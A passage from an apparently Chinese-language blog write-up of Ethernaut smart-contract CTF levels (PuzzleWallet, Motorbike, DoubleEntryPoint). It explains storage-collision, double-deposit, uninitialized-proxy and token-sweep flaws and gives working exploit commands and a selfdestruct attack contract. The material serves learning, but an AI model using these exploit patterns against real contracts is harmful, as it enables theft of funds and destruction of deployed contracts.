address(walletLogic), data);</span><br><span class="line">    PuzzleWallet instance &#x3D; PuzzleWallet(address(proxy));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; whitelist this contract to allow it to deposit ETH</span><br><span class="line">    instance.addToWhitelist(address(this));</span><br><span class="line">    instance.deposit&#123; value: msg.value &#125;();</span><br><span class="line"></span><br><span class="line">    return address(proxy);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function validateInstance(address payable _instance, address _player) override public view returns (bool) &#123;</span><br><span class="line">    PuzzleProxy proxy &#x3D; PuzzleProxy(_instance);</span><br><span class="line"></span><br><span class="line">    return proxy.admin() &#x3D;&#x3D; _player;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，先是创建一个<code>PuzzleWallet</code>合约，然后创建<code>PuzzleProxy</code>并最后返回<code>proxy</code>地址。</p>
<p>那为什么从<code>abi</code>层面来看，又是<code>PuzzleWallet</code>呢？其实这就是代理模式，我们实际上暴露的就是实际合约的接口，用户面向的是代理。</p>
<p>通过查看<code>UpgradeableProxy</code>的<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/Proxy.sol" target="_blank" rel="noopener">【源码1】</a>和<a href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/helpers/UpgradeableProxy-08.sol" target="_blank" rel="noopener">【源码2】</a>，我们可以发现，其在<code>fallback</code>函数中使用了<code>delegatecall</code>，该调用方式类似于库函数调用，借用远方地址的代码，修改本地的数据，但是该方式需要远方地址和本地地址有相同的存储槽相同，否则极易发生错误。</p>
<p>回到本关卡，为了达到将代理合约的管理员修改为我们自己，我们需要调用<code>approveNewAdmin()</code>函数，然后该函数只有管理者本身才可以调用，那我们该如何下手？我们仔细一想，我们能不能使用<code>delegatecall</code>来干点事，我们先看一下<code>PuzzleProxy</code>的存储：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---------------------------------</span><br><span class="line">|unused (12)| pendingAdmin (20) | &lt;- slot 0</span><br><span class="line">---------------------------------</span><br><span class="line">|unused (12)|      admin (20)   | &lt;- slot 1</span><br><span class="line">---------------------------------</span><br></pre></td></tr></table></figure>

<p>再看一下<code>PuzzleWallet</code>的存储：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---------------------------------</span><br><span class="line">|unused (12)|      owner (20)   | &lt;- slot 0</span><br><span class="line">---------------------------------</span><br><span class="line">|         maxBalance (32)       | &lt;- slot 1</span><br><span class="line">---------------------------------</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>实际上二者并不相同</strong>，如果我们尝试使用<code>delegatecall</code>的方式修改变量<code>maxBalance</code>的同时，也会修改<code>admin</code>。<strong>这是突破口</strong>。</p>
<p>我们再来看看，如何能够修改<code>maxBalance</code>，支持修改改变量的函数只有两个，一个是<code>init</code>和<code>setMaxBalance</code>，前者是只能在创建合约时候调用，后者是需要我们在白名单内，我们再看看如何把我们加入到白名单中，加入白名单需要调用<code>addToWhitelist</code>，而该函数又被限制了只能是<code>PuzzleWallet</code>的所有者（<code>owner</code>）才能访问，那我们看看能不能成为该所有者，很遗憾，<code>PuzzleWallet</code>中没有函数可以做到修改所有者，但是实际上我们还可以继续通过<code>delegatecall</code>进行。</p>
<p>由于<code>pendingAdmin</code>和<code>owner</code>是处于同一<code>slot</code>，即我们通过调用<code>PuzzleProxy.proposeNewAdmin</code>，即可完成对<code>owner</code>的修改。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.utils.keccak256(<span class="string">"proposeNewAdmin(address)"</span>)</span><br><span class="line"><span class="string">'0xa6376746fd40c5ce12d104971ce46bc4c5b160393fb8e6810412fb23e06a0770'</span></span><br><span class="line"><span class="comment">// 取前 4 个字节</span></span><br><span class="line">selector = <span class="string">'0xa6376746'</span></span><br><span class="line"><span class="comment">// 将我们的地址补全到 32 个字节</span></span><br><span class="line">param = <span class="string">'000000000000000000000000'</span> + player.slice(<span class="number">2</span>,)</span><br><span class="line">param.length == <span class="number">64</span></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>:selector + param&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.owner() == player</span><br></pre></td></tr></table></figure>

<p>完成上面以后，我们即可获取<code>PuzzleWallet</code>的所有权。</p>
<p>然后将我们加入到白名单中：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.addToWhitelist(player)</span><br></pre></td></tr></table></figure>

<p><code>setMaxBalance</code>函数还有一个要求，即合约拥有的以太币要为零。通过查询，<code>await getBalance(instance)</code>，我们发现，其内有0.001的以太币，如果我们想要通过<code>execute</code>函数转走合约中的余额，就要求<code>balances</code>中记录我们的余额不为零且大于要转走的数目，而现在该值为零，想要它不为零，则要先转入以太币，这样又造成了其余额增多，因此该方法不可取。</p>
<p>换句话说，如果我们如果能够通过某种方式使得<code>balances[player]&gt;player转给合约的以太币</code>，那么我们最后就可以通过<code>execute</code>将合约中的以太币都转走。</p>
<p>再仔细看看，我们发现<code>PuzzleWallet</code>中还有一个函数<code>multicall</code>，该函数是用于实现一次性完成多次交易的，我们还注意到，其函数内有一段代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (selector &#x3D;&#x3D; this.deposit.selector) &#123;</span><br><span class="line">	require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">    &#x2F;&#x2F; Protect against reusing msg.value</span><br><span class="line">    depositCalled &#x3D; true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说，在一次调用<code>multicall</code>中，最多只能对<code>deposit</code>调用一次，看上去心思缜密，但是实际上只是通过<code>selector</code>来进行判断，而这一步骤是可以绕过的，即第一次我们调用<code>deposit()</code>，第二次通过其本身调用<code>multicall(deposit())</code>，然后我们就可以使用0.001以太币的代价使得<code>balances[player]</code><strong>修改两次</strong>（因为<code>selector == this.deposit.selector</code>被我们绕过了，<code>multicall(deposit())</code>是通过<code>delegatecall</code>的方式调用，该方式调用时候<code>msg</code>不会改变）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取deposit()函数的签名</span></span><br><span class="line">depositData = <span class="keyword">await</span> contract.methods[<span class="string">"deposit()"</span>].request().then(<span class="function"><span class="params">v</span> =&gt;</span> v.data)</span><br><span class="line"><span class="comment">// 获取multicall(deposit())的签名</span></span><br><span class="line">multicallData = <span class="keyword">await</span> contract.methods[<span class="string">"multicall(bytes[])"</span>].request([depositData]).then(<span class="function"><span class="params">v</span> =&gt;</span> v.data)</span><br><span class="line"><span class="comment">// 通过一次调用multicall，实现两次调用deposit</span></span><br><span class="line"><span class="keyword">await</span> contract.multicall([depositData, multicallData], &#123;<span class="attr">value</span>: toWei(<span class="string">'0.001'</span>)&#125;)</span><br><span class="line"><span class="comment">// 确保合约记录我们的余额与合约拥有的代币数量相同</span></span><br><span class="line">fromWei(<span class="keyword">await</span> contract.balances(player)) == <span class="keyword">await</span> getBalance(instance)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里查询我们的“余额”使用<code>contract.balances()</code>是因为我们想要看看合约中记录的我们的余额是多少，即在合约看来，我们有多少钱，后者使用<code>getBalance</code>是查询合约拥有的以太币。</p>
</blockquote>
<p>下一步就是要清空合约中的以太币了：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.execute(player, toWei(<span class="string">'0.002'</span>), <span class="number">0x0</span>)</span><br><span class="line"><span class="keyword">await</span> getBalance(instance) == <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>下一步，就是通过设置设置<code>maxBalance</code>来修改<code>admin</code>了：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">player</span><br><span class="line">_maxBalance = <span class="string">'0x000000000000000000000000'</span> + player.slice(<span class="number">2</span>,)</span><br><span class="line">_maxBalance.length == <span class="number">66</span></span><br><span class="line"><span class="keyword">await</span> contract.setMaxBalance(_maxBalance)</span><br></pre></td></tr></table></figure>

<p><strong>我只能说这道题，完全碾压我😭</strong></p>
<h2 id="Motorbike"><a href="#Motorbike" class="headerlink" title="Motorbike"></a>Motorbike</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06&#x2F;utils&#x2F;Address.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-06&#x2F;proxy&#x2F;Initializable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Motorbike &#123;</span><br><span class="line">    &#x2F;&#x2F; keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT &#x3D; 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line">    </span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; Initializes the upgradeable proxy with an initial implementation specified by &#96;_logic&#96;.</span><br><span class="line">    constructor(address _logic) public &#123;</span><br><span class="line">        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        _getAddressSlot(_IMPLEMENTATION_SLOT).value &#x3D; _logic;</span><br><span class="line">        (bool success,) &#x3D; _logic.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;initialize()&quot;)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Delegates the current call to &#96;implementation&#96;.</span><br><span class="line">    function _delegate(address implementation) internal virtual &#123;</span><br><span class="line">        &#x2F;&#x2F; solhint-disable-next-line no-inline-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line">            let result :&#x3D; delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)</span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line">            switch result</span><br><span class="line">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class="line">            default &#123; return(0, returndatasize()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Fallback function that delegates calls to the address returned by &#96;_implementation()&#96;. </span><br><span class="line">    &#x2F;&#x2F; Will run if no other function in the contract matches the call data</span><br><span class="line">    fallback () external payable virtual &#123;</span><br><span class="line">        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Returns an &#96;AddressSlot&#96; with member &#96;value&#96; located at &#96;slot&#96;.</span><br><span class="line">    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot :&#x3D; slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Engine is Initializable &#123;</span><br><span class="line">    &#x2F;&#x2F; keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT &#x3D; 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    address public upgrader;</span><br><span class="line">    uint256 public horsePower;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize() external initializer &#123;</span><br><span class="line">        horsePower &#x3D; 1000;</span><br><span class="line">        upgrader &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Upgrade the implementation of the proxy to &#96;newImplementation&#96;</span><br><span class="line">    &#x2F;&#x2F; subsequently execute the function call</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;</span><br><span class="line">        _authorizeUpgrade();</span><br><span class="line">        _upgradeToAndCall(newImplementation, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Restrict to upgrader role</span><br><span class="line">    function _authorizeUpgrade() internal view &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; upgrader, &quot;Can&#39;t upgrade&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span><br><span class="line">    function _upgradeToAndCall(</span><br><span class="line">        address newImplementation,</span><br><span class="line">        bytes memory data</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        &#x2F;&#x2F; Initial upgrade and setup call</span><br><span class="line">        _setImplementation(newImplementation);</span><br><span class="line">        if (data.length &gt; 0) &#123;</span><br><span class="line">            (bool success,) &#x3D; newImplementation.delegatecall(data);</span><br><span class="line">            require(success, &quot;Call failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; Stores a new address in the EIP1967 implementation slot.</span><br><span class="line">    function _setImplementation(address newImplementation) private &#123;</span><br><span class="line">        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        </span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot :&#x3D; _IMPLEMENTATION_SLOT</span><br><span class="line">        &#125;</span><br><span class="line">        r.value &#x3D; newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件：</strong>将<code>Engine</code>进行销毁。</p>
<p>虽然<code>Engine</code>合约中没有调用<code>selfdestruct</code>函数的逻辑，但是该合约继承了<code>Initializable</code>，表明其具有更新的能力，为了更新<code>Engine</code>合约，使其具有<code>selfdestruct</code>函数的逻辑，我们要调用<code>upgradeToAndCall</code>，该函数会先调用<code>_authorizeUpgrade</code>，即对发起者进行判断是不是<code>upgrader</code>，后者的值可以在<code>initialize</code>中修改,前提是<code>Engine</code>没有被“完全”初始化，即<code>Engine</code>中的<code>initialized</code>为1.可是其真的为1了吗？</p>
<p>通过简单的审计，我们可以得出结论<code>Motorbike</code>是代理合约，<code>Engine</code>是逻辑合约，后者继承了<code>Initializable</code>合约，根据题目给的<code>Initializable</code>合约链接，我们可以知道<code>Initializable</code>中有两个布尔型变量，因此<code>Engine</code>的slot 0 布局如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-------------------------------------------------------</span><br><span class="line">unused(10)|upgrader(20)|initializing(1)|initialized(1)| &lt;- slot0</span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>此外，<code>Motorbike</code>合约将逻辑合约地址写入到了一个标准位置，即<code>_IMPLEMENTATION_SLOT</code>。</p>
<p>我们可以先看看该合约中的内容：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">slot = <span class="string">'0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance,slot)</span><br><span class="line"><span class="string">'0x00000000000000000000000099fd7881e8df22fbfc339184c2b7aa55bd803aa6'</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(<span class="string">'0x09c53d4a08a1b840fa4401e5219bdd91557c74a9'</span>,<span class="number">0</span>)</span><br><span class="line"><span class="string">'0x0000000000000000000000000000000000000000000000000000000000000000'</span></span><br></pre></td></tr></table></figure>

<p>我们可以看得到，实际上<code>initializing</code>和<code>initialized</code>都是<code>false</code>。也就是说我们是可以调用<code>initialize()</code>来将<code>upgrader</code>修改为我们的地址，然后再调用<code>upgradeToAndCall</code>，修改新地址为我们部署的合约，<code>data</code>设置为调用<code>selfdestruct()</code>，因此攻击合约如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity &lt;0.7.0;</span><br><span class="line">contract MotorbikeAttack &#123;</span><br><span class="line">	address public engin_addr ;</span><br><span class="line">	</span><br><span class="line">	constructor(address _engin_addr)public&#123;</span><br><span class="line">		engin_addr &#x3D; _engin_addr;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function attack() public&#123;</span><br><span class="line">        &#x2F;&#x2F; 先调用 initialize() ，将Engine中的upgrader设置为本合约地址</span><br><span class="line">		_setupgrader();</span><br><span class="line">        &#x2F;&#x2F; 部署一个含有 selfdestruct 逻辑的合约</span><br><span class="line">		ContractWithDestruct ct &#x3D; new ContractWithDestruct();</span><br><span class="line">        &#x2F;&#x2F; 由于在 Engine 中，会通过delegatecall的方式调用data</span><br><span class="line">		&#x2F;&#x2F; 因此实际上是 Engine 会执行</span><br><span class="line">		(bool success, ) &#x3D; engin_addr.call(</span><br><span class="line">			abi.encodeWithSignature(&quot;upgradeToAndCall(address,bytes)&quot;,</span><br><span class="line">			address(ct),abi.encodeWithSignature(&quot;destruct()&quot;))</span><br><span class="line">		);</span><br><span class="line">        require(success);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function _setupgrader() internal &#123;</span><br><span class="line">		(bool success, ) &#x3D; engin_addr.call(</span><br><span class="line">			abi.encodeWithSignature(&quot;initialize()&quot;)</span><br><span class="line">		);</span><br><span class="line">		require(success);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract ContractWithDestruct&#123;</span><br><span class="line">	function destruct()external&#123;</span><br><span class="line">		selfdestruct(msg.sender);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>await web3.eth.getStorageAt(instance,slot)</code>获得的地址部署上述合约，然后调用<code>attack</code>函数即可完成攻击。</p>
<h2 id="DoubleEntryPoint"><a href="#DoubleEntryPoint" class="headerlink" title="DoubleEntryPoint"></a>DoubleEntryPoint</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;access&#x2F;Ownable.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface DelegateERC20 &#123;</span><br><span class="line">  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address detectionBotAddress) external;</span><br><span class="line">    function notify(address user, bytes calldata msgData) external;</span><br><span class="line">    function raiseAlert(address user) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Forta is IForta &#123;</span><br><span class="line">  mapping(address &#x3D;&gt; IDetectionBot) public usersDetectionBots;</span><br><span class="line">  mapping(address &#x3D;&gt; uint256) public botRaisedAlerts;</span><br><span class="line"></span><br><span class="line">  function setDetectionBot(address detectionBotAddress) external override &#123;</span><br><span class="line">      usersDetectionBots[msg.sender] &#x3D; IDetectionBot(detectionBotAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function notify(address user, bytes calldata msgData) external override &#123;</span><br><span class="line">    if(address(usersDetectionBots[user]) &#x3D;&#x3D; address(0)) return;</span><br><span class="line">    try usersDetectionBots[user].handleTransaction(user, msgData) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125; catch &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function raiseAlert(address user) external override &#123;</span><br><span class="line">      if(address(usersDetectionBots[user]) !&#x3D; msg.sender) return;</span><br><span class="line">      botRaisedAlerts[msg.sender] +&#x3D; 1;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CryptoVault &#123;</span><br><span class="line">    address public sweptTokensRecipient;</span><br><span class="line">    IERC20 public underlying;</span><br><span class="line"></span><br><span class="line">    constructor(address recipient) &#123;</span><br><span class="line">        sweptTokensRecipient &#x3D; recipient;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setUnderlying(address latestToken) public &#123;</span><br><span class="line">        require(address(underlying) &#x3D;&#x3D; address(0), &quot;Already set&quot;);</span><br><span class="line">        underlying &#x3D; IERC20(latestToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;*</span><br><span class="line">    ...</span><br><span class="line">    *&#x2F;</span><br><span class="line"></span><br><span class="line">    function sweepToken(IERC20 token) public &#123;</span><br><span class="line">        require(token !&#x3D; underlying, &quot;Can&#39;t transfer underlying token&quot;);</span><br><span class="line">        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123;</span><br><span class="line">    DelegateERC20 public delegate;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123;</span><br><span class="line">        delegate &#x3D; newContract;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public override returns (bool) &#123;</span><br><span class="line">        if (address(delegate) &#x3D;&#x3D; address(0)) &#123;</span><br><span class="line">            return super.transfer(to, value);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return delegate.delegateTransfer(to, value, msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123;</span><br><span class="line">    address public cryptoVault;</span><br><span class="line">    address public player;</span><br><span class="line">    address public delegatedFrom;</span><br><span class="line">    Forta public forta;</span><br><span class="line"></span><br><span class="line">    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123;</span><br><span class="line">        delegatedFrom &#x3D; legacyToken;</span><br><span class="line">        forta &#x3D; Forta(fortaAddress);</span><br><span class="line">        player &#x3D; playerAddress;</span><br><span class="line">        cryptoVault &#x3D; vaultAddress;</span><br><span class="line">        _mint(cryptoVault, 100 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyDelegateFrom() &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; delegatedFrom, &quot;Not legacy contract&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier fortaNotify() &#123;</span><br><span class="line">        address detectionBot &#x3D; address(forta.usersDetectionBots(player));</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Cache old number of bot alerts</span><br><span class="line">        uint256 previousValue &#x3D; forta.botRaisedAlerts(detectionBot);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Notify Forta</span><br><span class="line">        forta.notify(player, msg.data);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Continue execution</span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Check if alarms have been raised</span><br><span class="line">        if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function delegateTransfer(</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value,</span><br><span class="line">        address origSender</span><br><span class="line">    ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;</span><br><span class="line">        _transfer(origSender, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：部署一个异常检测机器人，监测合约并防止外部攻击者耗尽<code>CryptoVault</code>，使其耗尽不应耗尽的代币。</p>
<blockquote>
<p>本关卡参考自：<a href="http://www.snowywar.top/?p=3848" target="_blank" rel="noopener">http://www.snowywar.top/?p=3848</a></p>
</blockquote>
<p>根据描述,我们知道我们有两个代币,一个<code>legacytoken</code>,是一个被废弃的,还有一个是<code>DcoubleEntrypoint</code>,是取而代之的新货币,即它是<code>legacytoken</code>新版本</p>
<p>有个<code>CryptoVault</code>的金库.提供一个<code>sweeptoken</code>的方法,允许任何人向<code>swepttokensrecipient</code>sweep.</p>
<p>检查就是我们不能转移<code>Vault</code>的<code>underlying</code>代币，实际上该地址是<code>DoubleEntryPoint</code>地址。</p>
<p>部署时两种代币分别持有100,我们的目的是创建一个检测机器人,检测合约防止被外部攻击者耗尽<code>cryptovault</code>。</p>
<p>通过观察<code>LegacyToken</code>合约，我们不难发现，<code>delegate</code>就是<code>DoubleEntryPoint</code>的合约本身,意味着在<code>legacyToken</code>上执行转移时,本质是<code>DoubleEntryPoint.delegateTransfer</code></p>
<p>对于<code>LegacyToken</code>合约：</p>
<ul>
<li><code>onlyDelegateFrom</code>只允许<code>delegateFrom</code>调用这个函数。在此案例中，只有<code>LegacyToken</code>合约被允许调用这个函数，否则任何人都可以从<code>origSender</code>调用<code>_transfer</code>（即低级别的ERC20转账）。</li>
<li><code>fortaNotify</code>是一个特殊的函数修改器，触发一些特定的Forta逻辑，就像我们之前看到的那样</li>
</ul>
<p><code>_transfer</code>只检查<code>to</code>和<code>orSender</code>不是<code>address(0)</code>，以及<code>origSender</code>有足够的代币转账到<code>to</code>，但它不检查<code>orSender</code>是<code>msg.sender</code>或花费者有足够的授权。这就是为什么我们有<code>onlyDelegateFrom</code>修改器。</p>
<p>通过结合我们收集到的所有信息，你是否发现了我们可以利用的错误？回顾一下我们现有的知识：</p>
<ul>
<li><code>CryptoVault</code>的<code>underlying</code>代币是<code>DoubleEntryPoint</code>。合约提供了一个<code>sweepToken</code>来转账Vault中的代币，但它阻止了对<code>DoubleEntryPoint</code>代币的转移（因为它是<code>underlying</code>）。</li>
<li><code>DoubleEntryPoint</code>代币是一个ERC20代币，它实现了一个自定义的<code>delegateTransfer</code>函数，只能由<code>LegacyToken</code>代币调用，并由Forta通过执行<code>fortaNotify</code>函数修改器监控。该函数允许委托人将一定数量的代币从 <code>origSpender</code>转账到一个任意的接收者。</li>
<li><code>LegacyToken</code>是一个已经被 <code>废弃</code>的ERC20代币。当<code>transfer(address to, uint256 value)</code>函数被调用时，<code>DoubleEntryPoint</code>（该代币的 <code>新版本</code>）<code>delegate.delegateTransfer(to, value, msg.sender)</code>被调用。</li>
</ul>
<p>问题出在哪里？因为<code>LegacyToken.transfer</code>是<code>DoubleEntryPoint.transfer</code>的 <code>镜像</code>，这意味着当你要求转账1个<code>LegacyToken</code>时，实际上你在转账1个<code>DoubleEntryPoint</code>代币（要做到这一点，余额中必须有这两者）。</p>
<p><code>CryptoVault</code>包含100个两种代币，但 <code>sweepToken</code>只阻止了 底层 <code>DoubleEntryPoint</code> 的转账。</p>
<p>但是通过了解<code>LegacyToken</code>的工作原理，我们可以通过调用<code>CryptoVault.sweep(address(legacyTokenContract))</code>轻松抽取所有<code>DoubleEntryPoint</code>代币。</p>
<p>既然我们知道如何利用它，下一步就是阻止该过程。</p>
<p>当<code>DoubleEntryPoint.delegateTransfer()</code>被调用时候，由于<code>fortaNotify</code>修饰器，<code>IForta</code>中的<code>handleTransaction</code>最终先被调用。</p>
<p>为了进一步处理，我们先来了解一下<code>msg.data</code>是如何被函数传递：</p>
<ul>
<li><p>最初，<code>msg.data</code>被修饰器<code>fortaNotify()</code>收到，将包含以下函数签名：<code>function delegateTransfer(address to, uint256 value, address origSender)</code></p>
</li>
<li><p>然后将其发送到调用 <code>handleTransaction(user, msgData)</code> 函数的 <code>notify()</code>函数。这将更改我们的函数接收到的<code>msg.data</code></p>
</li>
<li><p>最终的 <code>msg.data</code> 将包含函数 <code>handleTransaction(address user, bytes calldata msgData) external</code> 的<code>msg.data</code>；在第二个参数字节中，<code>calldata msgData</code>将是 <code>delegateTransfer()</code> 函数的实际<code>msg.data</code>。这是我们为了获取 <code>origSender</code> 的值而需要访问的内容。</p>
</li>
</ul>
<p>下表显示了我们将开发的检测机器人看到的调用数据的排列。我们要关注的值是 <code>0xa8</code>位置上的 <code>origSender</code>:</p>
<table>
<thead>
<tr>
<th>偏移量</th>
<th>变量大小（字节）</th>
<th>类型</th>
<th>值</th>
</tr>
</thead>
<tbody><tr>
<td>0x00</td>
<td>4</td>
<td>bytes4</td>
<td><code>handleTransaction(address,bytes)</code>的选择器== <code>0x220ab6aa</code></td>
</tr>
<tr>
<td>0x04</td>
<td>32</td>
<td>address</td>
<td><code>user</code> 的地址</td>
</tr>
<tr>
<td>0x24</td>
<td>32</td>
<td>uint256</td>
<td><code>msgData</code>的偏移量</td>
</tr>
<tr>
<td>0x44</td>
<td>32</td>
<td>uint256</td>
<td><code>msgData</code>的长度</td>
</tr>
